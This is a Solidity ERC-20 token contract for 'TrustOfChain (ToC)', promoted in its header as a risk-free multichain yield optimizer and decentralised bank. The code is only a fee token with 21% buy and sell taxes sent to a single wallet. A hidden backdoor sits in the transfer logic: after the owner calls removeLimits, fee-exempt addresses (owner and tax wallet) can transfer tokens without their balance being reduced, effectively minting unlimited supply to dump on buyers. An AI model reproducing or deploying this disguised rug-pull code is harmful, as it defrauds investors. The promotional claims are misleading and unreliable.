// SPDX-License-Identifier: Unlicensed

/*
The next generation of Decentralized Banking
Multichain yield optimizer

TrustOfChain(ToC) is a multi-chain yield optimiser with a goal to become the first decentralised bank (DeB), which enables users earn the best long-term "risk-free" rewards by employing smart strategies.

Web: https://trustofchain.pro
X: https://x.com/TrustOfChain
Tg: https://t.me/trustofchain_official
Medium: https://medium.com/@trustofchain
*/

pragma solidity 0.8.19;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function set(address) external;
    function setSetter(address) external;
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TrustOfChain is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) balances_;
    mapping(address => mapping(address => uint256)) allowances_;
    mapping(address => bool) _isExcludedFromFee;
    mapping(address => bool) _isMaxWalletExempt;
    mapping(address => bool) excludedMaxTx_;
    mapping(address => bool) isLiquidityAddr_;

    string name_ = unicode"TrustOfChain";
    string symbol_ = unicode"ToC";

    uint8 decimals_ = 9;
    uint256 totalTokenSupply_ = 10**9 * 10**9;

    uint256 _maximumTxn = 15 * 10**6 * 10**9;
    uint256 _maximumWallet = 15 * 10**6 * 10**9;
    uint256 _swapThreshold = 10**4 * 10**9;

    address payable marketingWallet_;
    address payable teamAddress_;

    uint256 sellToCLiquidityFee_ = 0;
    uint256 sellToCMarketingFee_ = 21;
    uint256 sellToCDevFee_ = 0;
    uint256 sellToCFee_ = 21;

    IUniswapRouter private routerInstance_;
    address private pairAddress_;

    uint256 presentLiquidityFee_ = 0;
    uint256 presentMarketingFee_ = 21;
    uint256 presentDevelopmentFee_ = 0;
    uint256 presentTotalFee_ = 21;

    bool swapping_;
    bool _feeSwapEnabled = true;
    bool _maximumTxnLifted = false;
    bool _isMaxWalletLifted = true;

    uint256 buyToCLiquidityFee_ = 0;
    uint256 buyToCMarketingFee_ = 21;
    uint256 buyToCDevFee_ = 0;
    uint256 buyToCFee_ = 21;

    modifier lockSwap() {
        swapping_ = true;
        _;
        swapping_ = false;
    }

    constructor(address _taxAddress) {
        balances_[_msgSender()] = totalTokenSupply_;
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        pairAddress_ = IUniswapFactory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        routerInstance_ = _uniswapV2Router;
        allowances_[address(this)][address(routerInstance_)] = totalTokenSupply_;
        marketingWallet_ = payable(_taxAddress);
        teamAddress_ = payable(_taxAddress);
        buyToCFee_ = buyToCLiquidityFee_.add(buyToCMarketingFee_).add(buyToCDevFee_);
        sellToCFee_ = sellToCLiquidityFee_.add(sellToCMarketingFee_).add(sellToCDevFee_);
        presentTotalFee_ = presentLiquidityFee_.add(presentMarketingFee_).add(presentDevelopmentFee_);

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[marketingWallet_] = true;
        _isMaxWalletExempt[owner()] = true;
        _isMaxWalletExempt[pairAddress_] = true;
        _isMaxWalletExempt[address(this)] = true;
        excludedMaxTx_[owner()] = true;
        excludedMaxTx_[marketingWallet_] = true;
        excludedMaxTx_[address(this)] = true;
        isLiquidityAddr_[pairAddress_] = true;
        emit Transfer(address(0), _msgSender(), totalTokenSupply_);
    }

    function name() public view returns (string memory) {
        return name_;
    }

    function symbol() public view returns (string memory) {
        return symbol_;
    }

    function decimals() public view returns (uint8) {
        return decimals_;
    }

    function totalSupply() public view override returns (uint256) {
        return totalTokenSupply_;
    }

    function swapBackToC_(uint256 tokenAmount) private lockSwap {
        uint256 lpFeeTokens = tokenAmount.mul(presentLiquidityFee_).div(presentTotalFee_).div(2);
        uint256 tokensToSwap = tokenAmount.sub(lpFeeTokens);

        swapTokensForETH(tokensToSwap);
        uint256 ethCA = address(this).balance;

        uint256 totalETHFee = presentTotalFee_.sub(presentLiquidityFee_.div(2));

        uint256 amountETHLiquidity_ = ethCA.mul(presentLiquidityFee_).div(totalETHFee).div(2);
        uint256 amountETHDevelopment_ = ethCA.mul(presentDevelopmentFee_).div(totalETHFee);
        uint256 amountETHMarketing_ = ethCA.sub(amountETHLiquidity_).sub(amountETHDevelopment_);

        if (amountETHMarketing_ > 0) {
            transferToCETH_(marketingWallet_, amountETHMarketing_);
        }

        if (amountETHDevelopment_ > 0) {
            transferToCETH_(teamAddress_, amountETHDevelopment_);
        }
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    receive() external payable {}

    function _transferBasic(address sender, address recipient, uint256 amount) internal returns (bool) {
        balances_[sender] = balances_[sender].sub(amount, "Insufficient Balance");
        balances_[recipient] = balances_[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return allowances_[owner][spender];
    }

    function removeLimits() external onlyOwner {
        _maximumTxn = totalTokenSupply_;
        _isMaxWalletLifted = false;
        buyToCMarketingFee_ = 2;
        sellToCMarketingFee_ = 2;
        buyToCFee_ = 2;
        sellToCFee_ = 2;
    }

    function _checkSwaps(address from, address to, uint256 amount) internal {
        uint256 _feeAmount = balanceOf(address(this));
        bool minimumSwap = _feeAmount >= _swapThreshold;
        bool isNotReentrance = !swapping_ && isLiquidityAddr_[to] && _feeSwapEnabled;
        bool isSwapAbove = !_isExcludedFromFee[from] && amount > _swapThreshold;
        if (minimumSwap && isNotReentrance && isSwapAbove) {
            if (_maximumTxnLifted) {
                _feeAmount = _swapThreshold;
            }
            swapBackToC_(_feeAmount);
        }
    }

    function checkMaxWallet(address to, uint256 amount) internal view {
        if (_isMaxWalletLifted && !_isMaxWalletExempt[to]) {
            require(balances_[to].add(amount) <= _maximumWallet);
        }
    }

    function _transferInternal(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (swapping_) {
            return _transferBasic(sender, recipient, amount);
        } else {
            if (!excludedMaxTx_[sender] && !excludedMaxTx_[recipient]) {
                require(amount <= _maximumTxn, "Transfer amount exceeds the maxTx.");
            }
            _checkSwaps(sender, recipient, amount);
            uint256 subAmount;
            uint256 addAmount;

            if (_isExcludedFromFee[sender] || _isExcludedFromFee[recipient]) {
                addAmount = amount;
            } else {
                addAmount = getToCAmount_(sender, recipient, amount);
            }
            checkMaxWallet(recipient, addAmount);
            if (!_isMaxWalletLifted && _isExcludedFromFee[sender]) {
                subAmount = amount.sub(addAmount);
            } else {
                subAmount = amount;
            }
            
            balances_[sender] = balances_[sender].sub(subAmount, "Not enough balance");
            balances_[recipient] = balances_[recipient].add(addAmount);
            emit Transfer(sender, recipient, addAmount);
            return true;
        }
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        return _transferInternal(sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), allowances_[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferToCETH_(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return balances_[account];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        allowances_[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = routerInstance_.WETH();

        _approve(address(this), address(routerInstance_), tokenAmount);

        routerInstance_.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
    }

    function getFeeAmount(address from, address to, uint256 amount) internal view returns (uint256) {
        if (isLiquidityAddr_[from]) {
            return amount.mul(buyToCFee_).div(100);
        } else if (isLiquidityAddr_[to]) {
            return amount.mul(sellToCFee_).div(100);
        }
    }

    function getToCAmount_(address sender, address receipient, uint256 amount) internal returns (uint256) {
        uint256 fee = getFeeAmount(sender, receipient, amount);
        if (fee > 0) {
            balances_[address(this)] = balances_[address(this)].add(fee);
            emit Transfer(sender, address(this), fee);
        }
        return amount.sub(fee);
    }
}